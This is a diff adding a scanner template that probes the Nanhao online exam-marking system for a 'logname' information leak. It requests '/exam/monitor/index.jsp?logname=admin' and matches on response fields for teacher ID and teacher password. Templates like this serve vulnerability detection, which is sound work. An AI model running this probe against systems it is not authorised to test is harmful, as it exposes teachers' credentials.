@@ -1,0 +1,31 @@
+id: poc-yaml-nanhao-oms-logname-info-leak
+info:
+  name: 南昊网上阅卷系统 logname 信息泄露漏洞
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure
+http:
+  - method: GET
+    path:
+      - "/exam/monitor/index.jsp?logname=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "admin"
+      - type: word
+        part: body
+        words:
+          - "教师ID"
+      - type: word
+        part: body
+        words:
+          - "教师密码"
+      - type: word
+        part: body
+        words:
+          - "是否在线"
